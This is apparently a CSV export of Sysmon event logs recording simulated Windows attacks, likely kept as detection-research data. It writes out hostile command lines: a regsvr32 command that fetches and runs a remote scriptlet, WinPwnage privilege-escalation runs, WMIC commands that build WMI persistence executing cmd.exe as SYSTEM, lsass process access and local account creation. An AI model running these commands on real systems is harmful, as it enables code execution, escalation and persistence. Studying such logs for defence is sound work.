27,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17285,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:02:49.160591100Z,5,C:\Windows\System32\mobsync.exe -Embedding,Microsoft Corporation,C:\Windows\system32\,Microsoft Sync Center,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=02A887DF2F485A19A051AF0F3D01DAC006DD9A83,MD5=CCA67BD391CFC9F036323B2522887A6A,SHA256=79F5BC1AD13A5575A52D39A000D0873B31865659B5EFC66A7FEF5E43E54C38B9,IMPHASH=8B7E2EE81565F21F95BADB244F9C56E6",C:\Windows\System32\mobsync.exe,Medium,{365ABB72-B0EC-5CD9-0000-00201D340100},0x000000000001341d,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-B0EB-5CD9-0000-00108D760000},596,{365ABB72-B147-5CD9-0000-00109D4F0B00},3828,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:02:47.527,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
28,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17286,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:03:19.681478000Z,5,/c notepad.exe,Microsoft Corporation,C:\Windows\system32\,Windows Command Processor,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",C:\Windows\System32\cmd.exe,High,{365ABB72-B0EC-5CD9-0000-0020DE330100},0x00000000000133de,C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\System32\svchost.exe,{365ABB72-B0EC-5CD9-0000-0010D9D20000},944,{365ABB72-B167-5CD9-0000-0010EE150C00},2372,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:03:19.482,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
29,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17287,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:03:19.681478000Z,5,/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll,Microsoft Corporation,C:\Windows\system32\,Microsoft(C) Register Server,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",C:\Windows\System32\regsvr32.exe,Medium,{365ABB72-B0EC-5CD9-0000-00201D340100},0x000000000001341d,C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\System32\svchost.exe,{365ABB72-B0EC-5CD9-0000-0010D9D20000},944,{365ABB72-B167-5CD9-0000-001062160C00},2476,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:03:19.497,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17288,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:03:19.895876800Z,5,notepad.exe,Microsoft Corporation,C:\Windows\system32\,Notepad,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3",C:\Windows\System32\notepad.exe,High,{365ABB72-B0EC-5CD9-0000-0020DE330100},0x00000000000133de,/c notepad.exe,C:\Windows\System32\cmd.exe,{365ABB72-B167-5CD9-0000-0010EE150C00},2372,{365ABB72-B167-5CD9-0000-00109D240C00},2584,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:03:19.727,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
31,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,3,17289,276,2056,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,3,2019-05-13T18:03:21.212898000Z,5,,,,,,,C:\Windows\System32\regsvr32.exe,,,,,,,,{365ABB72-B167-5CD9-0000-001062160C00},2476,,,,IEWIN7\IEUser,2019-05-13 18:03:20.485,,,,,,,,,,,151.101.128.133,false,443,https,true,tcp,IEWIN7,10.0.2.15,false,49159,,,,,,,,,,,,,,,,,,,
32,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17292,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:05:18.692037600Z,5,wmiadap.exe /F /T /R,Microsoft Corporation,C:\Windows\system32\,WMI Reverse Performance Adapter Maintenance Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=DC6DC543EAC398DE6821325BFF3625C1CFC8EC3D,MD5=52799EAD792B0E9AE7FD4BA5BD18FE5C,SHA256=BE4838F4DB23D56CF75730DD36451C5F0F2ACA36B8A74844E7675DC5D5AD0C58,IMPHASH=FAAD498DDAEF07E1AF22EEF06D02AE2C",C:\Windows\System32\wbem\WMIADAP.exe,System,{365ABB72-B0EB-5CD9-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\System32\svchost.exe,{365ABB72-B0EC-5CD9-0000-0010D9D20000},944,{365ABB72-B1DE-5CD9-0000-0010715B0D00},1188,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-05-13 18:05:18.676,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33,,,Microsoft-Windows-Sysmon/Operational,MSEDGEWIN10,,1,380456,3312,3928,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2020-09-10T17:48:47.077612400Z,5,c:\windows\system32\cmd.exe,Microsoft Corporation,c:\windows\system32\,Windows Command Processor,10.0.17763.592 (WinBuild.160101.0800),"SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",C:\Windows\System32\cmd.exe,System,{747F3D96-66F8-5F5A-E703-000000000000},0x00000000000003e7,\SystemRoot\System32\smss.exe,C:\Windows\System32\smss.exe,{747F3D96-66F4-5F5A-0300-00000000F600},300,{747F3D96-66F7-5F5A-0500-00000000F600},388,Microsoft® Windows® Operating System,-,0,NT AUTHORITY\SYSTEM,2020-09-10 17:48:39.678,,,,,,,,,,,,,,,,,,,,,,Cmd.Exe,,,,,,,,,,,,,,,,,
34,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16108,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:57:49.903159600Z,5,python  winpwnage.py -u elevate -5 -p c:\Windows\System32\cmd.exe,?,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,?,?,"SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5",C:\Python27\python.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,"""C:\Windows\System32\cmd.exe"" ",C:\Windows\System32\cmd.exe,{365ABB72-0C15-5CD7-0000-0010FB1C1500},2404,{365ABB72-0D1D-5CD7-0000-001020EF1500},3140,?,,1,IEWIN7\IEUser,2019-05-11 17:57:49.903,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
35,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16109,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:22.809409600Z,5,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,?,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,?,?,"SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5",C:\Python27\python.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,"""C:\Windows\System32\cmd.exe"" ",C:\Windows\System32\cmd.exe,{365ABB72-0C15-5CD7-0000-0010FB1C1500},2404,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,?,,1,IEWIN7\IEUser,2019-05-11 17:58:22.793,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
36,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16110,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:23.215659600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer CREATE Name=""BotConsumer23"", ExecutablePath=""c:\Windows\System32\cmd.exe"", CommandLineTemplate=""c:\Windows\System32\cmd.exe""",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D3F-5CD7-0000-0010DB251600},3184,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:23.200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
37,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,20,16111,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,20,2019-05-11T17:58:23.340659600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:23.340,,,,WmiConsumerEvent,,,,,,,,,,,,,,,,,,," ""c:\\Windows\\System32\\cmd.exe"""," ""BotConsumer23""",Created,Command Line,,,,,,,,,,,,,
38,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,21,16112,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,21,2019-05-11T17:58:23.418784600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:23.418,,,,WmiBindingEvent,,,,,,,,,,,,,,,,,,,,,Created,," ""CommandLineEventConsumer.Name=\""BotConsumer23\"""""," ""__EventFilter.Name=\""BotFilter82\""""",,,,,,,,,,,
39,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16113,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:23.450034600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""BotFilter82""', Consumer='CommandLineEventConsumer.Name=""BotConsumer23""'",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D3F-5CD7-0000-00108B381600},3196,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:23.356,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
40,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16114,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:23.590659600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter CREATE Name=""BotFilter82"", EventNameSpace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D3F-5CD7-0000-001089471600},1616,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:23.450,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
41,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,19,16115,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,19,2019-05-11T17:58:39.746909600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:39.746,,,,WmiFilterEvent,,,,,,,,,,,,,,,,,,,," ""BotFilter82""",Created,,,," ""root\\cimv2"""," ""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",,,,,,,,,
42,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16116,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:50.090659600Z,5,c:\Windows\System32\cmd.exe,Microsoft Corporation,C:\Windows\system32\,Windows Command Processor,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",C:\Windows\System32\cmd.exe,System,{365ABB72-8693-5CD7-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\wbem\WmiPrvSE.exe,{365ABB72-0D3F-5CD7-0000-00107F541600},3212,{365ABB72-0D5A-5CD7-0000-001069031700},2544,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-05-11 17:58:50.075,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
43,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,10,16117,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,10,2019-05-11T17:58:54.762534600Z,3,,,,,,,,,,,,,,,,,,,,,2019-05-11 17:58:54.762,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\SYSTEM32\ntdll.dll+4591c|C:\Windows\system32\KERNELBASE.dll+8185|c:\python27\DLLs\_ctypes.pyd+ed6a|c:\python27\DLLs\_ctypes.pyd+d9d6|c:\python27\DLLs\_ctypes.pyd+999e|c:\python27\DLLs\_ctypes.pyd+a1ce|c:\python27\DLLs\_ctypes.pyd+5b71|C:\Windows\system32\python27.dll+8f14c|C:\Windows\system32\python27.dll+113384|C:\Windows\system32\python27.dll+112f24|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12,0x00001410,c:\python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,2796,C:\Windows\system32\winlogon.exe,{365ABB72-8693-5CD7-0000-0010F4570000},444
44,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,10,16118,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,10,2019-05-11T17:58:54.762534600Z,3,,,,,,,,,,,,,,,,,,,,,2019-05-11 17:58:54.762,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\SYSTEM32\ntdll.dll+4591c|C:\Windows\system32\KERNELBASE.dll+8185|c:\python27\DLLs\_ctypes.pyd+ed6a|c:\python27\DLLs\_ctypes.pyd+d9d6|c:\python27\DLLs\_ctypes.pyd+999e|c:\python27\DLLs\_ctypes.pyd+a1ce|c:\python27\DLLs\_ctypes.pyd+5b71|C:\Windows\system32\python27.dll+8f14c|C:\Windows\system32\python27.dll+113384|C:\Windows\system32\python27.dll+112f24|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12,0x00001410,c:\python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,2796,C:\Windows\system32\lsass.exe,{365ABB72-8693-5CD7-0000-0010765E0000},492
45,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16119,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:54.887534600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer WHERE Name=""BotConsumer23"" DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-0010A1141700},2432,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.793,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
46,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,20,16120,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,20,2019-05-11T17:58:54.903159600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:54.903,,,,WmiConsumerEvent,,,,,,,,,,,,,,,,,,," ""c:\\Windows\\System32\\cmd.exe"""," ""BotConsumer23""",Deleted,Command Line,,,,,,,,,,,,,
47,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,19,16121,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,19,2019-05-11T17:58:54.981284600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:54.981,,,,WmiFilterEvent,,,,,,,,,,,,,,,,,,,," ""BotFilter82""",Deleted,,,," ""root\\cimv2"""," ""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",,,,,,,,,
48,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16122,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:55.028159600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter WHERE Name=""BotFilter82"" DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-0010E6241700},4084,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.918,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
49,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,21,16123,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,21,2019-05-11T17:58:55.090659600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:55.090,,,,WmiBindingEvent,,,,,,,,,,,,,,,,,,,,,Deleted,," ""CommandLineEventConsumer.Name=\""BotConsumer23\"""""," ""__EventFilter.Name=\""BotFilter82\""""",,,,,,,,,,,
50,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16124,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:55.153159600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=""BotFilter82""' DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-001047331700},3016,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.996,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
51,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134364,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T09:28:22.280329500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 09:28:22.279,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
52,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134365,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T09:28:22.280355700Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 09:28:22.279,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
53,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134366,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T09:28:42.976924500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 09:28:42.976,,,,DeleteKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
54,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134384,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:03:04.489453500Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:03:04.489,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\support,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
55,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134385,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:03:04.489480400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:03:04.489,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
56,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,12,2134398,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,12,2020-09-04T10:33:31.843453100Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:33:31.842,,,,CreateKey,HKLM\SAM\SAM\Domains\Account\Users\Names\sqlsvc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
57,,,Microsoft-Windows-Sysmon/Operational,LAPTOP-JU4M3I0E,,13,2134399,5424,6528,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2020-09-04T10:33:31.843489400Z,2,,,,,,,C:\windows\system32\lsass.exe,,,,,,,,{00247C92-7509-5F4E-0B00-000000002A00},900,,Valid Account - Local Account Created or Deleted,,,2020-09-04 10:33:31.842,,,Binary Data,SetValue,HKLM\SAM\SAM\Domains\Account\Users\Names\sqlsvc\(Default),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
